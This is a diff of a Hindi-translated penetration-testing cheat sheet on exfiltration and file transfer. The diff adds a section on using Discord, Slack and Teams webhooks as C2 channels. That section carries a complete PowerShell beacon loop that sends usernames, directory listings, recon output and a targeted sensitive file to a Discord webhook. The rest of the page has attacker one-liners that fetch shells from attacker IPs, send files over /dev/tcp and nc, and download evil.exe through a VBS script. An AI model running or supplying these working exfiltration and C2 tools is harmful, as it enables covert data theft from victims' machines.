@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## जानकारी निकालने के लिए सामान्य रूप से व्हाइटलिस्टेड डोमेन
+## Commonly whitelisted domains to exfiltrate information
 
-जानकारी निकालने के लिए सामान्य रूप से व्हाइटलिस्टेड डोमेन खोजने के लिए [https://lots-project.com/](https://lots-project.com/) पर जाएं
+[https://lots-project.com/](https://lots-project.com/) देखें ताकि commonly whitelisted domains ढूँढे जा सकें जिनका दुरुपयोग किया जा सकता है
 
 ## Copy\&Paste Base64
 
@@ -13,7 +13,7 @@
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**विंडोज़**
+**Windows**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
@@ -27,7 +27,7 @@ wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-**विंडोज़**
+**Windows**
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -100,9 +100,94 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+## Webhooks (Discord/Slack/Teams) C2 और Data Exfiltration के लिए
+
+Webhooks write-only HTTPS endpoints हैं जो JSON और वैकल्पिक file parts स्वीकार करते हैं। इन्हें आमतौर पर विश्वसनीय SaaS domains पर अनुमति दी जाती है और इनके लिए OAuth/API keys की आवश्यकता नहीं होती, जिससे ये low-friction beaconing और exfiltration के लिए उपयोगी रहते हैं।
+
+Key ideas:
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data जिसमें payload_json नाम का एक हिस्सा हो जो {"content":"..."} समाहित करे और वैकल्पिक file part(s) नामक file शामिल हों।
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK डिलीवरी की पुष्टि करते हैं।
+
+PowerShell PoC (Discord):
+```powershell
+# 1) Configure webhook and optional target file
+$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"
+
+# 2) Reuse a single HttpClient
+$client = [System.Net.Http.HttpClient]::new()
+
+function Send-DiscordText {
+param([string]$Text)
+$payload = @{ content = $Text } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] text -> $($resp.StatusCode)"
+}
+
+function Send-DiscordFile {
+param([string]$Path, [string]$Name)
+if (-not (Test-Path $Path)) { return }
+$bytes = [System.IO.File]::ReadAllBytes($Path)
+$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$mp.Add($fileContent, "file", $Name)
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
+}
+
+# 3) Beacon/recon/exfil loop
+$ctr = 0
+while ($true) {
+$ctr++
+# Beacon
+$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
+Send-DiscordText -Text $beacon
+
+# Every 2nd: quick folder listing
+if ($ctr % 2 -eq 0) {
+$dirs = @("Documents","Desktop","Downloads","Pictures")
+$acc = foreach ($d in $dirs) {
+$p = Join-Path $env:USERPROFILE $d
+$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
+if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
+}
+Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
+}
+
+# Every 3rd: targeted exfil
+if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }
+
+# Every 4th: basic recon
+if ($ctr % 4 -eq 0) {
+$who = whoami
+$ip  = ipconfig | Out-String
+$tmp = Join-Path $env:TEMP "recon.txt"
+"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
+Send-DiscordFile -Path $tmp -Name "recon.txt"
+}
+
+Start-Sleep -Seconds 20
+}
+```
+नोट:
+- समान पैटर्न अन्य सहयोगी प्लेटफ़ॉर्म (Slack/Teams) पर भी लागू होते हैं जो अपने incoming webhooks का उपयोग करते हैं; URL और JSON schema को तदनुसार समायोजित करें।
+- Discord Desktop cache artifacts और webhook/API recovery के DFIR के लिए देखें:
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
+{{#endref}}
+
 ## FTP
 
-### FTP सर्वर (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -143,14 +228,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali को सर्वर के रूप में
+Kali को server के रूप में
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-या smb शेयर **samba** का उपयोग करके बनाएं:
+या एक smb share बनाएं **using samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -165,7 +250,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-विंडोज
+विंडोज़
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -175,38 +260,38 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-हमलावर के पास SSHd चलाना आवश्यक है।
+attacker के सिस्टम पर SSHd चल रहा होना चाहिए।
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-यदि पीड़ित के पास SSH है, तो हमलावर पीड़ित से एक निर्देशिका को हमलावर पर माउंट कर सकता है।
+यदि victim के पास SSH है, तो attacker victim से attacker पर एक directory mount कर सकता है।
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## एनसी
+## NC
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### पीड़ित से फ़ाइल डाउनलोड करें
+### victim से फ़ाइल डाउनलोड करें
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### पीड़ित को फ़ाइल अपलोड करें
+### लक्ष्य पर फ़ाइल अपलोड करें
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-**@BinaryShadow\_** का धन्यवाद
+धन्यवाद **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -228,33 +313,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-यदि आप डेटा को SMTP सर्वर पर भेज सकते हैं, तो आप डेटा प्राप्त करने के लिए पायथन के साथ SMTP बना सकते हैं:
+यदि आप किसी SMTP server पर डेटा भेज सकते हैं, तो आप python के साथ डेटा प्राप्त करने के लिए एक SMTP बना सकते हैं:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-डिफ़ॉल्ट रूप से XP और 2003 में (अन्य में इसे स्थापना के दौरान स्पष्ट रूप से जोड़ा जाना चाहिए)
+XP और 2003 में डिफ़ॉल्ट रूप से उपलब्ध है (अन्य में इसे इंस्टॉलेशन के दौरान स्पष्ट रूप से जोड़ना पड़ता है)
 
-Kali में, **TFTP सर्वर शुरू करें**:
+Kali में, **TFTP server शुरू करें**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP सर्वर पायथन में:**
+**python में TFTP सर्वर:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**शिकार** में, Kali सर्वर से कनेक्ट करें:
+**पीड़ित** में Kali server से कनेक्ट करें:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-एक PHP oneliner के साथ एक फ़ाइल डाउनलोड करें:
+PHP oneliner के साथ फ़ाइल डाउनलोड करें:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -262,7 +347,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**शिकार**
+**पीड़ित**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -296,14 +381,24 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-The `debug.exe` प्रोग्राम न केवल बाइनरी की जांच करने की अनुमति देता है बल्कि इसमें **हैक्स से उन्हें फिर से बनाने की क्षमता भी है**। इसका मतलब है कि एक बाइनरी का हैक्स प्रदान करके, `debug.exe` बाइनरी फ़ाइल उत्पन्न कर सकता है। हालाँकि, यह ध्यान रखना महत्वपूर्ण है कि debug.exe में **64 kb आकार तक की फ़ाइलों को असेंबल करने की सीमा है**।
+`debug.exe` प्रोग्राम न केवल binaries का निरीक्षण करने की अनुमति देता है बल्कि इसमें **hex से उन्हें पुनर्निर्मित करने की क्षमता** भी है। इसका मतलब है कि किसी binary का hex प्रदान करके, `debug.exe` उस binary फ़ाइल को बना सकता है। हालाँकि, यह ध्यान रखना महत्वपूर्ण है कि debug.exe में **64 kb तक के आकार वाली फ़ाइलों को असेंबल करने की सीमा** है।
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-फिर टेक्स्ट को विंडोज-शेल में कॉपी-पेस्ट करें और एक फ़ाइल बनाई जाएगी जिसका नाम nc.exe होगा।
+फिर टेक्स्ट को windows-shell में कॉपी-पेस्ट करें और nc.exe नाम की एक फ़ाइल बनाई जाएगी।
+
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+
+## संदर्भ
+
+- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
 {{#include ../banners/hacktricks-training.md}}
